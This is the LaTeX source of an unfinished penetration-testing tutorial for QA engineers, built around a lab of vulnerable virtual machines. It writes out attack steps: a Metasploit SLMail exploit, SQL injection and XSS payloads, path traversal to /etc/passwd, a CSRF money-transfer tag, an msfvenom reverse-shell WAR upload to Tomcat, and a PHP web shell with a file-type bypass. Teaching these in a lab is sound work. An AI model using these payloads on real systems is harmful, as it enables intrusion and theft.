@@ -1,0 +1,603 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%    CRACKTHATNETWORK     %%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\documentclass{article}[12pt]
+\usepackage{graphicx}
+\usepackage{amsmath}
+\usepackage[utf8]{inputenc}
+\usepackage{amsfonts}
+\usepackage{hyperref}
+\usepackage[a4paper, total={6in, 9in}]{geometry}
+%\renewcommand{\baselinestretch}{1.3}
+%\graphicspath{{../pictures/}}
+%\setlength{\parindent}{0pt}
+
+
+\newcommand{\e}[1]{\begin{equation}#1\end{equation}}
+\newcommand{\p}[4]{\begin{figure}[ht]\begin{center}\includegraphics[#1]{#2}\caption[#3]{#4}\label{#2}\end{center}\end{figure}}
+\newcommand{\bd}[1]{\boldsymbol{#1}}
+\newcommand{\q}[1]{\texttt{#1}}
+%\setlength{\topmargin}{0in}
+
+%\cite{v}
+%\ref{picture}
+
+\title{\huge{PENETRATION TESTING INSTANT}}
+\author{Marcin Birski}
+
+
+
+\begin{document}
+\begin{center}
+\maketitle
+\newpage
+\end{center}
+
+%\newpage
+\begin{abstract}
+
+The book is all about cracking that network.
+\end{abstract}
+
+
+\tableofcontents
+\newpage
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%    CONFIGURATIONS     %%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\section{Introduction}
+This article was written for educational purposes for QA engineers in order to improve penetration testing skills. Article is based on my own experience as well as books mentioned in reference section. There are
+also applications and vulnerable systems attached to the file, it means that all instructions written below will be working on these systems. Penetration testing is practically all about finding vulnerabilities and exploit them.
+There are many tools presented in this text that allow you to scan the network, ports, protocols proceeding, as well as directly exploit the targets etc.
+Remember that penetration testing techniques are not given recipe how to break or exploit software, they are rather abstractive templates that you need to understand, digest and consciously use.
+
+
+
+
+\section{Software, Hardware, Network and Targets configuration}
+The following chapter will cover the most important stuff needed to build penetration testing laboratory. By laboratory I mean building the local network with static addresses enforced with operating systems, applications and proper hardware in order to keep
+investigations at one point and make sure we are not influencing innocent victims PC or laptop machines. During this chapter you will be asked to preinstall few virtual machines as well as configure their network parameters.
+You will also install some target software, as well as other perhaps less important but recommended applications.
+We will be using KALI Linux distribution for our penetration testing purposes. Treat KALI as an investigator. KALI Linux is Debian-based linux distribution which is the successor of BackTrack linux distribution. KALI has preinstalled
+dozens of penetration testing tools including information gathering, fingerprinting,target exploiting and so forth.
+\subsection{Hardware}
+It is recommended to use 40-50 GB of space for each operating system as well as at least 2 GB RAM for each. This is because sometimes you will need to
+run some test on few platforms simultaneously and each platform consumes its own RAM memory. Remember that you cannot leave your host machine with no RAM memory.
+\subsection{Virtual machines}
+
+First of all we will start from installing all needed systems and applications. Install mentioned systems within VirtualBox. Do the following steps:
+\begin{enumerate}
+\item{Install VirtualBox}
+\item{Install on VirtualBox:}
+\begin{itemize}
+\item{Kali 3.0.X}
+\item{Windows XP English SP3}
+\item{Windows 7 Professional SP1}
+\item{Ubuntu 8.10}
+\end{itemize}
+\item{Configure all machines networks to Bridged and select your main interface. Set all machines IPs to static. Remember IP for each machine in the network.
+On your host machine Desktop create folder to share. On each of machine create "Insert guest device" and configure it for folder you shared. This will allow you to transfer files with high speed from your host
+to your VMs. You might have problems with internet configuration on Windows, check if you have installed Intel drivers for network card, if not transfer them via shared folder and install on proper machines. If your Kali network does not work check your interface and check
+\texttt{/etc/network/interfaces}. You might also need to change \texttt{[ifupdown] managed} variable and set it to \texttt{true} in \texttt{/etc/NetworkManager/NetworkManager.conf}}
+
+\item{On Kali you need to add apt-get sources to \texttt{/etc/apt/sources.list} file. Add the following:
+
+\begin{itemize}
+\item{\texttt{deb http://http.kali.org/kali kali-rolling main contrib non-free}}
+\item{\texttt{deb http://old.kali.org/kali sana main non-free contrib}}
+\item{\texttt{deb http://old.kali.org/kali moto main non-free contrib}}
+\end{itemize}
+
+Afterwards update and upgrade apt-get and after this instal linux kernel headers by running:
+\texttt{apt-get install -y dkms linux headers \$(uname -r)},  \newline
+if this does not work include in mentioned command kernel version manually.
+}
+\item{On linux based machines you will probably need to restart networking by running: \texttt{service networking restart; service network-manager restart}}
+\item{Install on Windows XP:}
+\begin{itemize}
+\item{Zervit 0.4}
+\item{SLMail 5.5}
+\item{3Com TFTP 2.0.1}
+\item{XAMPP 1.7.2}
+\item{War-FTP}
+\item{WinSCP}
+\item{Immunity Debugger (ID); copy Mona.py to C:/Program Files/Immunity inc/Immunity Debugger/PyCommands; at the bottom of ID
+in command line type: \texttt{!mona config -set working folder c:/logs/\%p}, this will set logs output.}
+
+\end{itemize}
+\item{Make XP act like it is a mamber of a Windows Domain; many external targets are members of Windows Domain so we need this configuration
+also on our XP system; In order to set it up go to: \texttt{Start> Run> secpolmsc; Local Policies> Security Options> Network Access> Sharing and security model for local accounts:
+Classic - local users authenticate as themselves}}
+
+\item{Install on Kali:}
+
+
+\begin{itemize}
+\item{Android SDK; go to >packages and install Android SDK Tools and Platform Tools; afterwards you will install some Android emulator machines.}
+\item{Smartphone Pentest Framework; remember to configure for your host machine in text editor \texttt{kaliinstall} installation script.}
+\item{Nessus; go to Nessus web page, register new user and get registration keys; Nessus is opened by
+\texttt{/etc/init.d/nessusd start} command; open http://kali:8834 , provide password and username and download plugins.}
+\item{Hyperion; you will need to compile hyperion C code using g++.}
+\item{Veil-Evasion}
+\end{itemize}
+\item{Configure Ettercap; edit \texttt{/etc/ettercap/etter.conf} by uncommenting "iptables" redir commands. This sets up a firewall.}
+\item{Having configured all VMs ping them from host and vice versa.}
+\end{enumerate}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%    GATHERING THE INFORMATIONS     %%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\section{Investigations and information gathering}
+The most important thing in software testing are is to gather all possible and needed information about targets.
+The more information you are able to analyze, the better and the more valuable test you are able to perform.
+Obviously you can proceed with exploration testing with no knowledge about target but it only means you will gather this knowledge
+during the investigation what is the point of exploration testing. Remember that during information gathering phase the most important thing is to keep all info sorted in one place. You can install
+program called CherryTree for information storage porposes.
+
+
+% -------------------------- NETWORK SCANNING --------------------------------------
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Mapping network tools}
+%\texttt{} : \texttt{ }
+
+\subsubsection*{\texttt{whois <options> domain name}}
+This tools checks domain registration details like owner, technical contact, OS etc.
+
+\subsubsection*{\texttt{nmap <options> ip/ip range <options> <>}}
+This if powerfull tool allowing to scan ports or other system information on one or more then one IPs.
+\newline
+\newline
+
+\texttt{<XXX.XXX.XXX.XXX-XXX>} - Example IP range.
+\newline
+
+\texttt{-A} - Shows system parameters.
+\newline
+
+\texttt{-oA} - Output in three major formats at once (.nmap, .gnmap (grepable), XML) e.g.: \texttt{-oA <filename>}
+\newline
+
+\texttt{-p} - Port range e.g: \texttt{-p 0-500}
+\newline
+
+\texttt{-sS} - SYN scan, is part of TCP scan but without ACK (TCP handshake consist of SYN/SYN-ACK/ACK).
+SYN checks if ports are available but does not start the connection.: \texttt{-p 0-500}
+\newline
+
+\texttt{-sV} - Version scan, gives more detailed information about target.
+\newline
+
+\texttt{-sU} - UDP scan (User Datagram Protocol is a part of core members of Internet Protocol Suite). Nmap here
+sends a UDP packet to a port. If port is not open nmap recives "port unreachable" message. Usually this scan shows
+different ports than other scans and it takes more time to proceed.
+\newline
+
+
+
+\subsubsection*{\texttt{NetCat: nc <options> hostname port(s)}}
+Checks whether given ports are listening.
+\texttt{-v} - Verbose, use twice (-vv) to get more info, e.g: \texttt{nc -v 127.0.0.1  8080}
+
+\subsubsection*{\texttt{nslookup}}
+DNS translator. Example : \texttt{nslookup www.google.com}
+\subsubsection*{\texttt{host}}
+Ask for a servers for particular domain.
+
+\subsubsection*{\texttt{theHarvester}}
+Phyton tool quickly goes through many searching engines for possible email addresses.
+\newline
+
+\texttt{-d} - Domain name
+\newline
+
+\texttt{-l} - Limit outcomes
+\newline
+
+\texttt{-b} - Specify search engines e.g.: \texttt{ theharvester -d cogniance.com -l 100 -b all }
+
+\subsubsection*{\texttt{Maltego}}
+This data-mining tool visualises open source intelligence gathering. In order to run maltego type in
+command line \texttt{maltego}. You will be asked to register new account for free usage (maltego has also paid version
+which is more powerfull).
+
+\subsubsection*{\texttt{}}
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Hunting for vulnerabilities, NESSUS}
+
+Nessus has already been installed on Kali VM. In order to run Nessus you must run daemon by typing: \texttt{service nessusd start} in the terminal. Nessus by default is running on \texttt{https://kali:8834 port}. If you want to enter Nessus
+from outside of Kali you must type \texttt{https://<kali\_ip\_address>:8834}.
+
+\subsubsection*{Policies}
+
+Policies are the set of rules explaining what to do during scan or how to behave when vulnerability has been found. In order to create new policy go to Policies/New Policy.
+
+\subsubsection*{Scan}
+
+In order to prepare new scan go to My Scans/New Scan. Set up all needed information and set target(s) IP(s). After scanning all data about vulnerabilities can be found in my Scans section.
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Capturing traffic}
+\subsubsection{BurbSuite}
+
+Burb suite allows you to intercept (capture) information from/to websites through a proxy. When configuring burbsuite make sure that burbsuite works on localhost and port 8080 (obviously you can choose another one but must be the same as for browser) . Set manually your browser proxy on local host to 8080.
+It means: always you want to send a request from the client to website it passes thoutgh the proxy on port 8080 and is passed to the burbsuite. Burbsuite can manupilate requests and forward them after changes. It allows you ot manipulate
+requests and their parameters. When you set up proxy settings tun burb and your browser. From now all requests you send through browser  are catched in burb and you can change their parameters and forward them farther.
+
+\paragraph{Hint} \texttt{ctrl+U} encodes the text.
+
+\subsubsection{Wireshark}
+Wireshark is good monitoring tool for internet interfaces.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Web application scanning}
+\subsubsection*{nikto}
+Nikto is web applocaiton vulnerability scanner. Nikto output verboses information and potential vilnerabilities in terminal. This information are readable suggestions.
+\newline
+\texttt{nikto -h google.pl}
+
+\subsubsection{dirb}
+
+Dirb scanner uses predefined wordlist in order to check all child directories for provided parent one node eg:
+\newline
+\texttt{dirb 'http://10.10.10.76/admin/api'}
+
+\subsubsection{crawler (wmap)}
+It is actually powerful metasploit module and it is called: \texttt{auxilary/crawler/msfcrawler} and its being used in the same way as other metasploit modules.
+
+\subsubsection{websploit}
+
+This is a substitute for metasploit for web applications and its usage is very similar. One websploit module works similarly to wmap and it is called: \texttt{web/dir search}. Use is as regular websploit module.
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%    WEB APPLICATION TEStING     %%%%%%%%%%
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+N/A
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%    METASPLOIT     %%%%%%%%%%%%%%%
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Metasploit}
+Metasploit is a framework for penetration testing, which has included the whole base of vulnerabilities for different systems and API that allows testers to exploit or scan targets.
+By vulnerabilities here are meant points of the target which are not secured properly and are vulnerable for attack e.g:
+login or password buffer overflow on target's database server. Metasploit uses predefined exploits and payloads in order to get control over the target system.
+Exploit is technically program (procedure) that uses shellcode scripts in order to exploit vulnerabilities Each exploit and payload must be configured for particular target.
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{msfconsole}
+In order to use metasploit framework you can go directly to Applications->Exploitation tools and go to Metasploit. This approach will run the terminal simultaneously running all
+data bases and services in the background. If you wish you can run Metasploit directly from terminal by typing \texttt{msfconsole} but you might need to run postgresql service (\texttt{service postgresql start}).
+
+\subsubsection{Searching for exploits, run exploit}
+
+Now you need to see the info, options and payloads for the exploit by typing: \texttt{info, options, show payloads} respectively.
+If you know what exploit you will be using you can directly type into msf console the following line:
+\texttt{use <exploit/name>}. If you do not know the exploit you can check it online on www.rapid7.com
+or by typing in msf console \texttt{search <exploit/tag/orname>} and then you can \texttt{use} it.
+Afterwards you are moved to exploit subconsole. Now you need to set the payload: \texttt{set payload <payload/name>},
+then if you type \texttt{options} again, you will see all mandatory options (for listener and reciever).
+Now is time for setting up the options e.g: \texttt{set RHOST 192.168.4.56} or \texttt{set LHOST 192.168.4.56}
+if you are using reverse shell (pushing the connection back to the listener (attack machine) rather than
+waiting for an incoming connection from target which is more likely to make connection through firewall \cite{pen}).
+
+\subsubsection{Outputing data}
+If you want to output data somewhere (which is VERY usefull) you can use spooling before you start exploiting. Just type in msf console (before running exploit) \texttt{spool <file-name.txt/log/etc>}.
+In order to turn off spooling use \texttt{spool off}. Spool saves the whole terminal output stream.
+\paragraph{Example}
+In this example you will get control over the Windows XP SP3 system which you installed as VM. In msfconsole run the following: \newline\newline
+\texttt{use/windows/pop3/seattlelab\_pass} \newline
+\texttt{set RHOST XXX.XXX.XXX.XXX} (your target IP) \newline and run the exploit by typing: \newline \texttt{exploit} \newline \newline
+
+Now you are in meterpreter sub console. Check the following commands: \texttt{help, background, pwd, shell}, for more commands go to: https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/ .
+So what has happend ? You exploited unauthenticated buffer overflow vulnerability in the POP3 server of Seattle Lab Mail 5.5 by sending a password with excessive length (for more info check exploit info in msfconsole, for more info about buffer overflow go to Buffer Overflow section in this article).
+
+\subsubsection{msfcli}
+MetaSploit Framework Command Line Interpreter is another way to interact with Metasploit. Is especially useful while scripting Metasploit commands or while testing new payloads in automated way.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Metasploit Scanner Modules and Check functions}
+
+Metasploit serves vulnerability searching modules, these modules begin from \texttt{scanner/}. In order to use metasploit scanner treat scanner as regular module and run is with \texttt{use <module\_name>}, set up options and run exploit. Example module can be \texttt{scanner/ftp/anonymous} which searches for anonymous access via FTP ports, which can be dangerous when some important data
+are stored on client side and are allowed to use FTP port.
+
+Some explois have embeeded \texttt{check} functions. They can be used instead of \texttt{exploit} function in order to litarelly check if targer is vulnerable to given exploit.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{Armitage}
+
+Armitage is GUI for metasploit enriched by many automated tools helping a tester figure out what exploit should be used (what is the target vulnerability). In order to run Armitage go to Applications-> Exploitation Tools.
+Login to database with default credentials. Armitage is good option if you have no ideal what exploit you should use. There two options to get that knowledge. First is to check all possible attacks and choose preferred one, second is run Heil Mary and perform all possible attacks one after another. The difference is that first method
+only checks for available exploits for the target whereas the second one runs all exploits without asking. The problem is that the second one can really crash the system, so it is not recommended but still worth to work around. First of all go to: Hosts->Nmap->Intense\_scan or Hosts->MSFscan
+, you will then get your local network scanned so you will know what systems are there and what exploit you will be able to use. In order to perform first option go to: Hosts->Find\_attacks. After this you will need click on selected machine and choose check all possible attacks separately, then choose proper exploit and use it. If you want to use second option go to Hosts>Heil Mary, after this all possible exploits will be ran on the target system. If your system is
+vulnerable and can be affected, the system "screen" icon will changed and you will be informed about action taken over the system. Then you can run meterpreter from target options and use the same commands like in terminal meterpreter.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%------------------------------- MUTILLIDAE-------------------------------------------
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\section{Mutillidae} Mutillidae is webpage build by OWASP team. The webpage consist of many vulnerabilities and can be used for practising techniques. In order to run Mutillidae download it from OWASP page. Mutillidae folder
+consist of many PHP files, txt files and many others. Copy the folder to your localhost htdocs folder (in my case /opt/lampp/htdocs). Here I assumed you have already installed and configured XAMPP the newest version. Dont mistake this XAMPP distro with the vulnerable one we installed for testing purposes. Finally restart (or start) XAMPP by typing \texttt{./xampp start} (or restart).
+Now you can use all Mutillidae features.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%------------------------------- TOP WEB VULNERABILITIES-------------------------------
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+
+\section{Top Web and Application vulnerabilities}
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{XSS} XSS is known as Cross Site Scripting. XSS is all about embeeding unneded code within website. If application stores any kind of user input and shows this input to the user or allows you to store any kind of data within html, there is always risk that XSS can be done over the website.
+
+\subsubsection{Reflected} Injected code is used only once (it can be used many times indeed but is always used in time of sending it, copying, pasting, reloading the page etc). For example if your application uses somehow show the data passed through CGI to the end user (e.g. embeeds CGI parameters inside html) attack can be
+performed by passing invalid URL: \texttt{http://application.com/search.php?title=<script>action()</script>}. Another technique is to pass mailicious code after \# hash in URL: \texttt{}.
+\subsubsection{Stored}  Code is stored and is ran every time page is being ran.
+\subsubsection{DOM-based} Could be considered as refelected XSS. Injected script is located on client side (for instance: data stored after \# in URL (www.site.com/index.php\#<script></script>) is not transmitted to the server - it stays locally on client side or in DOM)-DOM-based XSS does not reach the server.
+DOM-baset XSS payload can be injected inside html events like follows: \texttt{<input type="button" name="button" onmouseover="javascript:document.action()">}. In example above custom function action() is executed when moving mouse coursor over the button. There are many attributes like: \texttt{onload, onclick} etc. In another case javascript script path can be embeeded as path to image like follows:
+\texttt{<IMG source="javascript:<path\_to\_the\_script>"}. In this example source can be either javascript script itself or just path to script located somewhere in the internet or locally. It means that source could become:
+\texttt{...source="http://magicsctipts.end/magicalscript.js"}
+
+\subsubsection{BeEF} Beef is a tool for conducting XSS attacks.
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Injections}
+\subsubsection{SQL injection}
+Let's imagine there is an user input in the application or on the web page that allows end user to interact with database. SQL injection appears when
+user input data is not properly validated and sanitized and input provided by user can be threated by database engine as a part of SQL syntax. If mentioned input is login and password the simple example SQL syntax could look like:
+\newline
+\texttt{SELECT * FROM users WHERE login='<user input login>' and password='<user input password>'}
+\newline
+If input is not properly secured simple SQL injection could take place while providing the phrase between quotes "":\texttt{"' OR 1=1 -- "}. Whis phrase within the entire query qill look like:
+\newline
+\texttt{SELECT * FROM users WHERE login='' OR 1=1 -- ' and password='<user input password>'}
+So it does not matter what password we provided since is was commented out by "-- " which comments out queries in SQL syntax. Remember that after "-- " one space is present.
+In mentioned query "1=1" statement always recives TRUE so the whole query is executed. Obciously before commenting out the password input we could finish this query and start another one with different function (in this query we deal with SELECT FROM function).
+
+There are few methods protecting againts SQL injection. First of all we should sanitize the input. Sanitization is the process of removing all SQL, JS, PHP etc syntax special characters from user input. Example below shows the example PHP validation and sanitisation functions:
+\newline
+\newline
+\texttt{\$sanitzeEmail = filter\_var(\$emailToValidate, FILTER\_SANITIZE\_EMAIL);}
+\newline
+\texttt{\$validateEmail = filter\_var(\$emailToValidate, FILTER\_VALIDATE\_EMAIL);}
+\newline
+
+On the other hand if we do not want to block user to use special characters we should use Parametrized Queries and Prepared Statements. While using parmetrised queries we do not send query directly to database. Instead of it we send query with parameter placed at input variable place, and in the next step we send user input to the parameter.
+In whis approach we tell database what functions query consists of but we also say that everything that comes after query and points the given parameter should be treated as plane text, not as SQL syntax. In PHP it could be done by:
+\newline
+\newline
+\texttt{\$statement=\$pdo->prepare(SELECT * FROM emplyees WHERE name = :name');}
+\newline
+\texttt{\$statement=\$pdo->execute(array('name'=>\$name));}
+\newline
+
+In this example \texttt{\$statement} is our PHP variable  which is being prepared in memory and waits for execution. It means it waits for \texttt{\$name} variable which usually comes via POST method. \texttt{\$pdo} here is an instance of PDO (PDO Data Objects) library.
+
+SQL injection can be conducted from many points of view. The potential targets are: CGI parameters, input forms, HTTP request headers.
+
+
+\paragraph{SQL map} is Kali tool that allows to automate sql injection. When using sqlmap obligatory parameters are these pointing at the target e.g \texttt{u,r}. In url providing scenario you must use the following syntax: \texttt{sqlmap -u http://examplesite.pl/index.php?id=1}
+\newline
+This is important to ensure get parameters in url in this case. If you are dealing with different scenario (e.g. POST method) you can intercept the request in Burb and copy it to \texttt{example.request} file (you create this file somwhere in the system). Then you can use this request file and pass it in sqlmap by \texttt{-r} flag: \newline
+\texttt{sqlmap -r "../../example.request"}
+\paragraph{Practise with Mutillidae. }
+In this example you can practise sqlmap in Mutillidae. Go to userinfo page. Choose  any kind of user, send request and intercept it in Burb. Save request as file.request and pass it in sqlmap. You should see that at least "username" parameter is injectible.
+Usually it it better to sent only request rather than url because it decreases mistakes and mismatches.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{IDOR - Insecure Direct Object References}
+\subsubsection{Local File Inclusion} It includes local files on webpoage. Always when your application deals with including files you can consider both local and remote file inclusion. You must find the place where files are appended od included somehow. You must replace file directory with some local directory where files you want to include are present. In this scenario you can use only files from local machine that user is working on.
+\paragraph{Practice with Mutillidae. }
+In this Example we will include passwords file from local machine using Mutillidae. Go to Mutillidae and find Insecure Direct Object Reference section. Turn on Burb and interseption on. Choose file in selector and request uploading. Go to Burp and change \texttt{textfile} attribute by replacing txt file directory by (using path traversal) \texttt{../../../../../../../../../../../etc/passwd}. Everything should look like: \texttt{textfile=../../../../../../../../../../etc/passwd\&text-file-viewer-php-sumbit-button=View+file}. The most important part in here is first one where by traversaling the path we are getting text file from /etc/passwd. \texttt{textfile} in here is POST attribute. Obviously we could repleca original directory by any other one where even PHP code is included.
+
+\subsubsection{Remote File Inclusion} As name says for its own it includes files remotely. It can include file and upload it to server. This is critical vulnerability because mailicious user can remotly control server files and in the worst scenario control server shell.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\subsection{Security Misconfigurations}
+Is your software actual ? \newline
+Do you use features ? What features do you use ? \newline
+Default passwords ? Do you hash them ? \newline
+How do you perform your error handling ? \newline
+Who see your logs? How they can see them? \newline
+Does your logger or HTTP requests/responses prints out information about software and server?
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\subsection{XSRF - Cross Site Request Forgery} This vulnerabilities base on the idea that for instance cookies are stored locally and transferred between sites which gives good user experience because users do not need to login every time on website. Logging process is realized by cookie verification. It means that if you logged somewhere and your cookie is stored - you are verified user. Information that you are veirfied could be used to perform dangerous actions.
+
+\paragraph{Money transfer example} Lets consider situation when you are transfering money from your account to another one. You logged into the bank account and secured (in terms of probability) cookie has been stored locally on your machine. While transfering money you technicaly send GET or POST request. Your bank server recives your request from website, verifies cookie and transfers money. Example GET request could look like: \\
+\texttt{http://bank.com/transfers?amount=1000\&account=3789987123789123}. \\
+It could be also realized by POST method but for now GET gives clear approach. Now, lets consider that attacker somehow invites you to his site. On the site the following html code is hidden: \\
+\texttt{<img source="http://bank.com/transfers?amount=1000\&account=attackers\_account\_number">}\\
+So attacker replaced the account number with his number. When you enter the page your browser loads all content including this img. Request for img is sent by GET method but is not the img course but just money transfer which is confirmed by cookie stored on your machine.\\
+
+Situation from the example is very simple but in real life attacker could lead you through his website simultaneously collecting data about you and afterwards convince you to click some button to send your request. Real button could really be the real one - it could transfer you to trusted site but there could be another dangerous button, hidden below with smaller z-index. \\\\
+Application APIs should be designed in the way that GET performs no changes on the server side. GET method should only be used for navigation or downloading content.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+\subsection{Remote Code Execution (RCE)}
+Remote code execution takes place when you are able to execute for inscance shell commands on the remote
+machine. It can happen when you upload script file to the web page (javascript) which is executed or when you
+upload script files on the server and these are interpreted and executed as normal secure code. In this
+scenario you can upload a piece of software that executes shell commands and sends them back from the remote mashine
+to you. In general you can work on remote terminal as it was located on your machine.
+\paragraph{Tomcat Java servlet upload} In this example I describe how remote code execution is done basing on servlet upload on tomcat server.
+Lets consider tomcat server works on 10.10.10.10:8080 port (we know this from nmap). We also know from nmap that operating system
+is Windows x65. Now we enumerate tomcat users using
+\texttt{auxiliary/scanner/http/tomcat\_mgr\_login}. Lets assume enumeration gives: \texttt{tomcat:tomcat}.
+Once the tomcat user is logged in go to place when WAR files are uploaded. Make payload using \texttt{msfvenom -p windows/x64/shell/reverse\_tcp lhost\=192.168.1.4 -f war>tom.war} (\texttt{-f war} stands for format of input file and \texttt{lhost} is our host).
+If war file has been compiled you can check what is inside by: \texttt{jar tvf <file-name>.war}. There is file with .jsp extension and this file will execute shell and transmit it to our listener.
+Now upload .war file on the server and run in the msfconsole \texttt{multi/handler}. Multihandling listener will run in terminal and will be wating for connections coming from remote machine.
+Lat step is to go to \texttt{http://10.10.10.10:8080/...../<war-file-name>/<jsp-file-name>.jsp}. Finally you should see remote terminal and execute commands remotely.
+
+\subsection{Buffer Overflow}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{PHP script injection}
+Some websites allows users to upload content other than text e.g photos, movies, games and many other odd file formats. While it is not properly controlles what type is being saved user is able to embeed PHP code which will be executed every time while trying to "see" uploaded content.
+The vulnerability here is the remote shell execution. PHP code which executes shell is simple : \texttt{echo shell\_exec(<shell script>);}, where shell script is the one executed by shell on local server. In order to run the script you should find possibility to embeed the following script on the html page: \texttt{<?php echo shell\_exec(\$\_GET['variable']); ?>}. In this scenario every time you open the page you added  the code to
+you will be able to send shell commands remotely by passing them as GET variable via URI.
+
+\paragraph{Hint} Check your PHP file type by \texttt{file filename.php}. Add \texttt{GIF8;} line as first line in your PHP file. Check again.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%---------------------------SECURITY BEST PRACTISES-----------------------------------
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Security Best Practises}
+
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%---------------------------APPENDIX--------------------------------------------------
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Appendix}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\subsection{checksums}
+Sometimes there is a need to calculate check sum of the file. Calculating check sum is nothing more than
+taking a binary file and using the algorithm calculating short string that fully depends on content of the file. In other words
+if only one letter or space has been changed in file check sum will be looking totally different. There are many algorithms like MD5, SHA1 or SHA2 that we can use. In order to calculate checksum on Linux type in terminal:
+\texttt{md5sum <file-name>} or \texttt{sha1sum <file-name>} etc.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Linux Bonus}
+\paragraph{passwd} This text file consist of users and passwords information. It consist of bunch of lines like: \newline
